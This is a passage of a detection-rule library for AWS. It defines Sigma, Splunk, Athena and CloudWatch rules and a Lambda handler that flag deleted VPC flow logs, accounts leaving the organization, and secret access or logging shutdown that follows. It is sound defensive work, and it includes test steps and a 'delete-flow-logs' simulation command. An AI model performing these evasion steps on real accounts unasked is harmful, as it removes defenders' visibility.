  SELECT userIdentity.arn AS actor, eventTime AS abuse_time, eventName
  FROM cloudtrail_logs
  WHERE (eventSource = 'ses.amazonaws.com' AND eventName IN ('PutIdentityPolicy', 'SetIdentityNotificationTopic', 'VerifyEmailIdentity'))
    OR eventName = 'CreateAccessKey'
)
SELECT e.actor, e.enum_time, a.abuse_time, a.eventName
FROM enum_evt e
JOIN abuse_evt a ON e.actor = a.actor
  AND a.abuse_time > e.enum_time
  AND a.abuse_time <= e.enum_time + INTERVAL '30' MINUTE
ORDER BY e.enum_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource
| filter (eventSource = "ses.amazonaws.com" and eventName in ["ListIdentities", "GetIdentityVerificationAttributes"])
  or (eventSource = "ses.amazonaws.com" and eventName in ["PutIdentityPolicy", "SetIdentityNotificationTopic", "VerifyEmailIdentity"])
  or eventName = "CreateAccessKey"
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "ListIdentities", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { identityType: "EmailAddress" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify enumeration and follow-on abuse sequence.", "Verify if abuse was authorized.", "Check for phishing or credential theft indicators."],
    testingSteps: ["Call ListIdentities, then PutIdentityPolicy or CreateAccessKey within 30 min.", "Run Splunk or Athena correlation query."],
  },

  // --- VPC Flow Logs Removal ---
  {
    id: "det-110",
    title: "VPC Flow Logs Deleted",
    description: "Baseline visibility for deletion of one or more flow logs. Flow log deletion is intrinsically sensitive because it removes telemetry rather than merely reading or changing data.",
    awsService: "EC2",
    relatedServices: [],
    severity: "High",
    tags: ["EC2", "VPC", "Flow Logs", "Defense Evasion"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate infra cleanup", "Flow log rotation"],
    rules: {
      sigma: `title: VPC Flow Logs Deleted
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: DeleteFlowLogs
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=DeleteFlowLogs
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'DeleteFlowLogs'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "DeleteFlowLogs"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
      lambda: `"""
VPC Flow Logs Deleted - Lambda/EventBridge Handler
Trigger: EventBridge rule matching CloudTrail DeleteFlowLogs events.
Use for: Real-time alerting, enrichment (DescribeFlowLogs, identity lookup), or integration with SOAR.
"""
import json
import boto3
from datetime import datetime

def lambda_handler(event, context):
    detail = event.get("detail", {})
    event_source = detail.get("eventSource", "")
    event_name = detail.get("eventName", "")

    # Detection logic: ec2.amazonaws.com + DeleteFlowLogs
    if event_source != "ec2.amazonaws.com" or event_name != "DeleteFlowLogs":
        return {"matched": False}

    user_identity = detail.get("userIdentity", {})
    flow_log_ids = detail.get("requestParameters", {}).get("flowLogIds", [])

    alert = {
        "rule_id": "det-110",
        "title": "VPC Flow Logs Deleted",
        "severity": "High",
        "timestamp": detail.get("eventTime", datetime.utcnow().isoformat() + "Z"),
        "actor": user_identity.get("arn", "unknown"),
        "source_ip": detail.get("sourceIPAddress", ""),
        "flow_log_ids": flow_log_ids,
        "account_id": detail.get("recipientAccountId", ""),
    }

    # Optional: Enrich with DescribeFlowLogs to get VPC/subnet context
    # ec2 = boto3.client("ec2")
    # for fl_id in flow_log_ids:
    #     resp = ec2.describe_flow_logs(FlowLogIds=[fl_id])
    #     ...

    return {"matched": True, "alert": alert}
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.flowLogIds", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { flowLogIds: ["fl-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and deleted flow log IDs.", "Verify if deletion was authorized.", "Check for follow-on network or exfiltration activity."],
    testingSteps: ["Call DeleteFlowLogs.", "Verify CloudTrail captures the event.", "Run the detection."],
    lifecycle: {
      whyItMatters: "Flow log deletion removes network telemetry—a high-signal defense-evasion event. Few legitimate operations require deleting flow logs; attackers use it to blind defenders before exfiltration or C2.",
      threatContext: {
        attackerBehavior: "An attacker with ec2:DeleteFlowLogs deletes VPC flow log configurations to evade network-based detection. Flow logs capture accepted/rejected traffic for VPCs, subnets, or ENIs; deletion blinds defenders to C2, exfiltration, and lateral movement.",
        realWorldUsage: "Common in post-compromise defense evasion; observed in cloud-focused threat campaigns where attackers reduce logging before exfiltration.",
        whyItMatters: "Removing telemetry is a high-signal event—few legitimate operations require deleting flow logs at scale.",
        riskAndImpact: "Loss of network visibility enables undetected data exfiltration, C2 traffic, and lateral movement.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.flowLogIds", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail must be enabled with EC2 management events", "No Data Events required"],
        limitations: ["Flow log IDs in requestParameters.flowLogIds require enrichment (DescribeFlowLogs) to map to VPC/subnet", "Cross-account deletion may have delayed propagation"],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail event source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "API action" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor identity" },
          { rawPath: "requestParameters.flowLogIds", normalizedPath: "aws.ec2.flowLogIds", notes: "Target flow log IDs" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["change"], action: "DeleteFlowLogs", outcome: "success", provider: "aws" },
          user: { name: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
          cloud: { provider: "aws", account: { id: "123456789012" } },
          aws: { ec2: { flowLogIds: ["fl-0abc123"] } },
          source: { ip: "203.0.113.10" },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Identity Context", description: "User/role metadata, owner, department; service account age, last-used.", examples: ["user.email from HR/Okta", "service_account.age_days", "service_account.last_used"], falsePositiveReduction: "Filter known network/platform admins" },
        { dimension: "IP Reputation", description: "Threat intelligence and geolocation for source IP.", examples: ["Tor exit node detection", "Known C2 infrastructure", "GeoIP for impossible travel"], falsePositiveReduction: "Escalate when source IP has threat intel hits" },
        { dimension: "Asset Metadata", description: "Flow log to VPC/subnet tags for target sensitivity.", examples: ["VPC tags: prod, egress, security", "Data classification", "DescribeFlowLogs → VPC mapping"], falsePositiveReduction: "Higher severity for prod/egress/security VPCs" },
        { dimension: "Behavioral Baselines", description: "Historical behavior patterns for this identity.", examples: ["First-time DeleteFlowLogs for this identity", "Deviation from typical network-admin roles"], falsePositiveReduction: "Alert when non-privileged actor performs deletion" },
      ],
      logicExplanation: {
        humanReadable:
          "This detection identifies deletion of VPC flow log configurations via the DeleteFlowLogs API. Flow logs capture network traffic (accepted/rejected) for VPCs, subnets, or ENIs; their removal eliminates visibility into lateral movement, C2, and exfiltration. The rule is intentionally broad to provide baseline coverage—every DeleteFlowLogs event is in scope. In production, layer enrichment (identity context, asset criticality) or downstream correlation to reduce noise.",
        conditions: [
          "eventSource equals ec2.amazonaws.com",
          "eventName equals DeleteFlowLogs",
          "No additional filters—all DeleteFlowLogs events match",
        ],
        tuningGuidance:
          "To reduce false positives: (1) Add an actor allowlist—exclude IAM roles used by network/platform automation (e.g., roles containing 'Network', 'Platform', 'Infra'). (2) Enrich with DescribeFlowLogs to map flow log IDs to VPC/subnet tags—escalate when target VPCs are tagged prod, egress, or security. (3) Correlate with det-111 (Flow Logs Deletion by Unexpected Actor) for higher-fidelity alerts.",
        whenToFire:
          "Fire on every DeleteFlowLogs event in CloudTrail. Legitimate flow log deletion is rare; most environments see fewer than 10 events per month. If volume is high, apply tuning before suppressing.",
      },
      simulationCommand: "aws ec2 delete-flow-logs --flow-log-ids fl-0abc123",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Low (legitimate cleanup is rare)",
        expectedVolume: "1–10 events/month (org-dependent)",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "CloudWatch Logs Insights", "Splunk", "Datadog", "Panther", "Chronicle"],
        scheduling: "Batch: every 5–15 minutes; Real-time: EventBridge rule + Lambda or SIEM streaming",
        considerations: ["Ensure CloudTrail log group/bucket has appropriate retention", "Consider correlation with det-113 for follow-on behavior (DeleteFlowLogs → exfiltration)", "No Data Events required—management events only"],
      },
      detectionFlow: [
        { id: "1", label: "CloudTrail Event (ec2.amazonaws.com)", type: "source" },
        { id: "2", label: "DeleteFlowLogs API Call", type: "transform" },
        { id: "3", label: "Detection Rule (eventSource + eventName match)", type: "rule" },
        { id: "4", label: "Alert", type: "alert" },
      ],
    },
  },
  {
    id: "det-111",
    title: "Flow Logs Deletion by Unexpected Actor",
    description: "Detects deletion performed by identities that should not manage network logging. Suspicious: IAM users outside network/platform admin, application roles, workload roles, unusual assumed roles.",
    awsService: "EC2",
    relatedServices: [],
    severity: "Critical",
    tags: ["EC2", "VPC", "Flow Logs", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known infra/network automation", "Terraform/CloudFormation"],
    rules: {
      sigma: `title: Flow Logs Deletion by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: DeleteFlowLogs
  filter_arn:
    userIdentity.arn|contains:
      - '/role/Network'
      - '/role/Platform'
      - '/role/Admin'
      - '/role/Infra'
  filter_automation:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
  condition: selection and not (filter_arn or filter_automation)
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=DeleteFlowLogs
| where NOT (like(userIdentity.arn, "%/role/Network%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Infra%") OR like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'DeleteFlowLogs'
  AND userIdentity.arn NOT LIKE '%/role/Network%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Infra%'
  AND (userIdentity.principalId IS NULL OR (userIdentity.principalId NOT LIKE '%terraform%' AND userIdentity.principalId NOT LIKE '%cloudformation%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "DeleteFlowLogs"
| filter userIdentity.arn not like /\\/role\\/(Network|Platform|Admin|Infra)/ and userIdentity.principalId not like /terraform|cloudformation/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.flowLogIds", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { flowLogIds: ["fl-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for flow log management.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-network role, call DeleteFlowLogs.", "Verify detection triggers."],
  },
  {
    id: "det-112",
    title: "Deletion of Sensitive Flow Logs",
    description: "Detects deletion of flow logs tied to sensitive VPCs, subnets, or ENIs. Critical targets: prod VPCs, egress VPCs, security tooling VPCs, domain/directory subnets. Requires flow log ID to VPC/subnet enrichment where available.",
    awsService: "EC2",
    relatedServices: [],
    severity: "Critical",
    tags: ["EC2", "VPC", "Flow Logs", "Sensitive Target"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized cleanup of prod flow logs", "Flow log migration"],
    rules: {
      sigma: `title: Deletion of Sensitive Flow Logs
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: DeleteFlowLogs
  condition: selection
level: critical
# Enrich flowLogIds with VPC/subnet tags (prod, egress, security) in SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=DeleteFlowLogs
| table _time, userIdentity.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
# Enrich: lookup flowLogIds to VPC/subnet; filter where resource has prod|egress|security|domain in name/tags`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'DeleteFlowLogs'
ORDER BY eventTime DESC
-- Enrich: Join with DescribeFlowLogs/DescribeVpcs to identify prod/egress/security VPCs`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "DeleteFlowLogs"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.flowLogIds", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { flowLogIds: ["fl-prod-vpc-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify deleted flow log IDs.", "Enrich with VPC/subnet context (prod, egress, security).", "Verify if deletion was authorized."],
    testingSteps: ["Delete flow logs for a prod VPC.", "Verify detection triggers with enrichment."],
  },
  {
    id: "det-113",
    title: "Flow Logs Removal Followed by Suspicious Network or Exfiltration Behavior",
    description: "High-confidence defense-evasion: DeleteFlowLogs then shortly afterward same actor performs internet gateway changes, route table changes, security group changes, NACL changes, snapshot sharing, secrets access, or data-exfiltration-adjacent actions.",
    awsService: "EC2",
    relatedServices: ["Secrets Manager", "S3", "KMS"],
    severity: "Critical",
    tags: ["EC2", "VPC", "Flow Logs", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate infra changes after flow log cleanup"],
    rules: {
      sigma: `title: Flow Logs Removal Followed by Suspicious Behavior
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_delete:
    eventSource: ec2.amazonaws.com
    eventName: DeleteFlowLogs
  selection_suspicious:
    eventName:
      - AttachInternetGateway
      - CreateRoute
      - AuthorizeSecurityGroupIngress
      - AuthorizeSecurityGroupEgress
      - CreateNetworkAclEntry
      - ModifySnapshotAttribute
      - GetSecretValue
      - Decrypt
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ec2.amazonaws.com AND eventName=DeleteFlowLogs) OR (eventName=AttachInternetGateway OR eventName=CreateRoute OR eventName=AuthorizeSecurityGroupIngress OR eventName=AuthorizeSecurityGroupEgress OR eventName=CreateNetworkAclEntry OR eventName=ModifySnapshotAttribute OR eventName=GetSecretValue OR eventName=Decrypt))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_delete=if(eventSource="ec2.amazonaws.com" AND eventName="DeleteFlowLogs", 1, 0)
| eval is_suspicious=if(eventName IN ("AttachInternetGateway","CreateRoute","AuthorizeSecurityGroupIngress","AuthorizeSecurityGroupEgress","CreateNetworkAclEntry","ModifySnapshotAttribute","GetSecretValue","Decrypt"), 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_delete=1))>0 AND mvcount(mvfilter(is_suspicious=1))>0
| table _time, actor, eventName, requestParameters.flowLogIds`,
      cloudtrail: `WITH delete_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS delete_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName = 'DeleteFlowLogs'
),
suspicious_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS sus_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('AttachInternetGateway', 'CreateRoute', 'AuthorizeSecurityGroupIngress', 'AuthorizeSecurityGroupEgress', 'CreateNetworkAclEntry', 'ModifySnapshotAttribute', 'GetSecretValue', 'Decrypt')
)
SELECT d.actor, d.delete_time, s.sus_time, s.eventName
FROM delete_evt d
JOIN suspicious_evt s ON d.actor = s.actor
  AND s.sus_time > d.delete_time
  AND s.sus_time <= d.delete_time + INTERVAL '30' MINUTE
ORDER BY d.delete_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.flowLogIds
| filter (eventSource = "ec2.amazonaws.com" and eventName = "DeleteFlowLogs")
  or eventName in ["AttachInternetGateway", "CreateRoute", "AuthorizeSecurityGroupIngress", "AuthorizeSecurityGroupEgress", "CreateNetworkAclEntry", "ModifySnapshotAttribute", "GetSecretValue", "Decrypt"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.flowLogIds", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { flowLogIds: ["fl-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify DeleteFlowLogs and follow-on activity sequence.", "Verify if follow-on changes indicate exfiltration or stealth.", "Check for snapshot sharing or secrets access."],
    testingSteps: ["Delete flow logs, then perform ModifySnapshotAttribute or GetSecretValue within 30 min.", "Run Splunk or Athena correlation query."],
  },

  // --- AWS Organizations Leave ---
  {
    id: "det-114",
    title: "Member Account Attempted to Leave Organization",
    description: "Baseline visibility for any LeaveOrganization attempt. This is inherently dangerous because it can remove the account from SCPs and organization policy coverage. Even the attempt matters.",
    awsService: "Organizations",
    relatedServices: [],
    severity: "Critical",
    tags: ["Organizations", "LeaveOrganization", "Defense Evasion"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized account migration", "Org restructuring"],
    rules: {
      sigma: `title: Member Account Attempted to Leave Organization
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: organizations.amazonaws.com
    eventName: LeaveOrganization
  condition: selection
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=organizations.amazonaws.com eventName=LeaveOrganization
| table _time, userIdentity.type, userIdentity.arn, userIdentity.accountId, recipientAccountId, errorCode, errorMessage, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.accountId, recipientAccountId, errorCode, errorMessage, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'organizations.amazonaws.com'
  AND eventName = 'LeaveOrganization'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.accountId, recipientAccountId, errorCode, errorMessage, sourceIPAddress
| filter eventSource = "organizations.amazonaws.com"
| filter eventName = "LeaveOrganization"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.accountId", "recipientAccountId", "errorCode", "errorMessage", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the account and actor.", "Verify if leave was authorized.", "Check errorCode for blocked attempts."],
    testingSteps: ["Call LeaveOrganization from member account root.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-115",
    title: "LeaveOrganization Called by Root Context",
    description: "Detects the most dangerous execution context: LeaveOrganization invoked through root or highly privileged standalone account context. The technique is operationally strongest when invoked through root.",
    awsService: "Organizations",
    relatedServices: [],
    severity: "Critical",
    tags: ["Organizations", "LeaveOrganization", "Root"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized root-initiated leave"],
    rules: {
      sigma: `title: LeaveOrganization Called by Root Context
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: organizations.amazonaws.com
    eventName: LeaveOrganization
  filter_root:
    userIdentity.type: 'Root'
  condition: selection and filter_root
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=organizations.amazonaws.com eventName=LeaveOrganization
| where userIdentity.type="Root"
| table _time, userIdentity.type, userIdentity.accountId, recipientAccountId, errorCode, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.accountId, recipientAccountId, errorCode, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'organizations.amazonaws.com'
  AND eventName = 'LeaveOrganization'
  AND userIdentity.type = 'Root'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.accountId, recipientAccountId, errorCode, sourceIPAddress
| filter eventSource = "organizations.amazonaws.com"
| filter eventName = "LeaveOrganization"
| filter userIdentity.type = "Root"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.accountId", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Confirm root context.", "Verify if account leave was authorized.", "Check for follow-on guardrail-sensitive activity."],
    testingSteps: ["Call LeaveOrganization as root.", "Verify detection triggers."],
  },
  {
    id: "det-116",
    title: "Failed LeaveOrganization Attempt",
    description: "Detects defense-evasion attempts that were blocked by SCPs or organization configuration. A blocked attempt is still a serious incident signal because it suggests active evasion intent.",
    awsService: "Organizations",
    relatedServices: [],
    severity: "Critical",
    tags: ["Organizations", "LeaveOrganization", "Defense Evasion"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Expected policy denial during testing"],
    rules: {
      sigma: `title: Failed LeaveOrganization Attempt
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: organizations.amazonaws.com
    eventName: LeaveOrganization
  filter_error:
    errorCode|exists: true
  condition: selection and filter_error
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=organizations.amazonaws.com eventName=LeaveOrganization
| where isnotnull(errorCode) AND errorCode!=""
| table _time, userIdentity.type, userIdentity.arn, userIdentity.accountId, errorCode, errorMessage, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.accountId, errorCode, errorMessage, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'organizations.amazonaws.com'
  AND eventName = 'LeaveOrganization'
  AND errorCode IS NOT NULL
  AND errorCode != ''
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.accountId, errorCode, errorMessage, sourceIPAddress
| filter eventSource = "organizations.amazonaws.com"
| filter eventName = "LeaveOrganization"
| filter ispresent(errorCode)
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "errorCode", "errorMessage", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, errorCode: "AccessDenied", errorMessage: "SCP denied", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the error and blocking mechanism.", "Verify if attempt was malicious.", "Review SCP or org settings that blocked it."],
    testingSteps: ["Attempt LeaveOrganization when SCP denies it.", "Verify detection triggers on error."],
  },
  {
    id: "det-117",
    title: "LeaveOrganization Followed by Guardrail-Sensitive Activity",
    description: "High-confidence defense-evasion: LeaveOrganization then shortly afterward same actor or account performs IAM policy modification, KMS key scheduling, security control disabling, access-key creation, or logging reduction.",
    awsService: "Organizations",
    relatedServices: ["IAM", "KMS", "CloudTrail"],
    severity: "Critical",
    tags: ["Organizations", "LeaveOrganization", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate post-leave account setup"],
    rules: {
      sigma: `title: LeaveOrganization Followed by Guardrail-Sensitive Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_leave:
    eventSource: organizations.amazonaws.com
    eventName: LeaveOrganization
  selection_sensitive:
    eventName:
      - PutUserPolicy
      - AttachRolePolicy
      - PutRolePolicy
      - CreateAccessKey
      - PutKeyPolicy
      - UpdateTrail
      - StopLogging
  condition: 1 of selection_*
level: critical
# Full correlation (account/actor, 1h) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=organizations.amazonaws.com AND eventName=LeaveOrganization) OR (eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy OR eventName=CreateAccessKey OR eventName=PutKeyPolicy OR eventName=UpdateTrail OR eventName=StopLogging))
| eval acct=coalesce(recipientAccountId, userIdentity.accountId)
